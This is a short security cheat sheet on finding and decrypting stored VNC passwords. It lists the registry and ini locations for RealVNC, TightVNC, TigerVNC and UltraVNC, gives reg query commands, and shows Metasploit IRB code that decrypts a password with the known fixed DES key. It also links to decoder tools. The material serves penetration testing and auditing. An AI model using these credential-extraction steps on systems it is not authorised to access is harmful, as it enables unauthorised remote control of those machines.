# Locating The Encrypted VNC Password

1. Open regedit.exe
2. Expand the HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\ until you reach vncserver.
3. At the right pane, you should see a registry name called Password with the type as REG_SZ and random characters for the data. The random characters you see for Password is the encrypted password for RealVNC.

## RealVNC
```
HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver
HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4
HKLM\\Software\\RealVNC\\WinVNC4
HKCU\\Software\\RealVNC\\WinVNC4
HKLM\\Software\\RealVNC\\Default
HKCU\\Software\\RealVNC\\Default
Value: Password
```

## TightVNC
```
HKEY_CURRENT_USER\Software\TightVNC\Server
HKLM\SOFTWARE\TightVNC\Server\ControlPassword
tightvnc.ini
vnc_viewer.ini
Value: Password or PasswordViewOnly
```

## TigerVNC
```
HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4
Value: Password
```

## UltraVNC
```
C:\Program Files\UltraVNC\ultravnc.ini
Value: passwd or passwd2
```

## Other
```
HKLM\\Software\\ORL\\WinVNC3
HKCU\\Software\\ORL\\WinVNC3
HKLM\\Software\\ORL\\WinVNC3\\Default
HKCU\\Software\\ORL\\WinVNC3\\Default
HKLM\\Software\\ORL\\WinVNC\\Default
HKCU\\Software\\ORL\\WinVNC\\Default
```


### reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
```
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
```

### reg query HKLM\SOFTWARE\TightVNC\Server /s

```
C:\Windows\system32>reg query HKLM\SOFTWARE\TightVNC\Server /s

HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server
--- SNIP ---
    Password    	REG_BINARY    D7A514D8C556AADE
    ControlPassword    	REG_BINARY    1B8167BC0099C7DC
--- SNIP ---
```

With the encypted VNC password: D7A514D8C556AADE

decrypt it easily using the Metasploit Framework and the IRB (ruby shell) with these 3 commands:
```
fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
require 'rex/proto/rfb'
Rex::Proto::RFB::Cipher.decrypt ["YOUR ENCRYPTED VNC PASSWORD HERE"].pack('H*'), fixedkey
```


### Example:
taken from: https://github.com/frizb/PasswordDecrypts
```
$> msfconsole

msf5 > irb
[*] Starting IRB shell...
[*] You are in the "framework" object

>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
 => "\u0017Rk\u0006#NX\a"
>> require 'rex/proto/rfb'
 => true
>> Rex::Proto::RFB::Cipher.decrypt ["D7A514D8C556AADE"].pack('H*'), fixedkey
 => "Secure!\x00"
>> 
```





### Decrypting The Encrypted VNC Password
download the tool "VNC password decoder 0.2 (vncpwd)" from aluigi, in the password recovery section
http://aluigi.org/pwdrec.htm

https://github.com/jeroennijhof/vncpwd




http://aluigi.org/pwdrec/vncpwd.zip




http://tools88.com/safe/vnc.php
